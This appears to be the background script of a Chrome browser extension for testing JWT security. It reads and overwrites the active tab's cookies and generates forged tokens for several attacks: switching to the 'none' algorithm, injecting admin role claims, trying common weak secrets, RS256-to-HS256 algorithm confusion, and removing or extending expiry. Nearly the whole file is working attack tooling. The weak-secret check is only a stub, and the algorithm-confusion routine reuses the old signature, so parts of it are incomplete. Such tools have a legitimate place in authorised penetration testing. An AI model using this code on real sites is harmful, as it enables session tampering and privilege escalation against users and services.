// Listen for messages from the panel
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "getCookies") {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      const currentTab = tabs[0];
      chrome.cookies.getAll({ url: currentTab.url }, (cookies) => {
        sendResponse({ cookies });
      });
    });
    return true; // Will respond asynchronously
  }

  if (request.action === "updateCookie") {
    const { name, value, url } = request.cookie;
    chrome.cookies.set({
      url: url,
      name: name,
      value: value,
      path: "/"
    }, (cookie) => {
      sendResponse({ success: !!cookie });
    });
    return true;
  }

  if (request.action === "testJWT") {
    const { token, type } = request;
    
    switch (type) {
      case "none":
        testNoneAlgorithm(token, sendResponse);
        break;
      case "role":
        testRoleEscalation(token, sendResponse);
        break;
      case "secrets":
        testWeakSecrets(token, sendResponse);
        break;
      case "alg":
        testAlgorithmConfusion(token, sendResponse);
        break;
      case "exp":
        testExpirationBypass(token, sendResponse);
        break;
    }
    return true;
  }
});

// JWT Testing Functions
function testNoneAlgorithm(token, sendResponse) {
  const parts = token.split('.');
  if (parts.length !== 3) {
    sendResponse({ success: false, error: "Invalid JWT format" });
    return;
  }

  try {
    // Modify header to use 'none' algorithm
    const header = JSON.parse(atob(parts[0]));
    header.alg = 'none';
    const newHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
    const newToken = `${newHeader}.${parts[1]}.`;
    
    sendResponse({ 
      success: true, 
      token: newToken,
      message: "Created token with 'none' algorithm" 
    });
  } catch (error) {
    sendResponse({ success: false, error: error.message });
  }
}

function testRoleEscalation(token, sendResponse) {
  const parts = token.split('.');
  if (parts.length !== 3) {
    sendResponse({ success: false, error: "Invalid JWT format" });
    return;
  }

  try {
    const payload = JSON.parse(atob(parts[1]));
    const modifications = [
      { role: 'admin' },
      { role: 'administrator' },
      { isAdmin: true },
      { admin: true },
      { permissions: 'admin' }
    ];

    const results = modifications.map(mod => {
      const newPayload = { ...payload, ...mod };
      const newPayloadBase64 = btoa(JSON.stringify(newPayload)).replace(/=/g, '');
      return `${parts[0]}.${newPayloadBase64}.${parts[2]}`;
    });

    sendResponse({ 
      success: true, 
      tokens: results,
      message: "Created tokens with elevated privileges" 
    });
  } catch (error) {
    sendResponse({ success: false, error: error.message });
  }
}

function testWeakSecrets(token, sendResponse) {
  const commonSecrets = [
    "secret",
    "password",
    "123456",
    "admin",
    "key",
    "test",
    "development",
    "production"
  ];

  // In a real implementation, you would test these secrets against the token
  // For demo purposes, we'll just return the list of possible tokens
  sendResponse({
    success: true,
    message: "Test these secrets against the backend",
    secrets: commonSecrets
  });
}

function testAlgorithmConfusion(token, sendResponse) {
  const parts = token.split('.');
  if (parts.length !== 3) {
    sendResponse({ success: false, error: "Invalid JWT format" });
    return;
  }

  try {
    const header = JSON.parse(atob(parts[0]));
    if (header.alg && header.alg.startsWith('RS')) {
      header.alg = 'HS256';
      const newHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
      const newToken = `${newHeader}.${parts[1]}.${parts[2]}`;
      
      sendResponse({
        success: true,
        token: newToken,
        message: "Created token with algorithm confusion (RS256 -> HS256)"
      });
    } else {
      sendResponse({
        success: false,
        error: "Token is not using RSA algorithm"
      });
    }
  } catch (error) {
    sendResponse({ success: false, error: error.message });
  }
}

function testExpirationBypass(token, sendResponse) {
  const parts = token.split('.');
  if (parts.length !== 3) {
    sendResponse({ success: false, error: "Invalid JWT format" });
    return;
  }

  try {
    const payload = JSON.parse(atob(parts[1]));
    const results = [];

    // Test 1: Set expiration to far future
    const futurePayload = { ...payload, exp: Math.floor(Date.now() / 1000) + 31536000 };
    const futureToken = `${parts[0]}.${btoa(JSON.stringify(futurePayload)).replace(/=/g, '')}.${parts[2]}`;
    results.push(futureToken);

    // Test 2: Remove expiration
    if (payload.exp) {
      const { exp, ...noExpPayload } = payload;
      const noExpToken = `${parts[0]}.${btoa(JSON.stringify(noExpPayload)).replace(/=/g, '')}.${parts[2]}`;
      results.push(noExpToken);
    }

    sendResponse({
      success: true,
      tokens: results,
      message: "Created tokens with modified expiration"
    });
  } catch (error) {
    sendResponse({ success: false, error: error.message });
  }
} 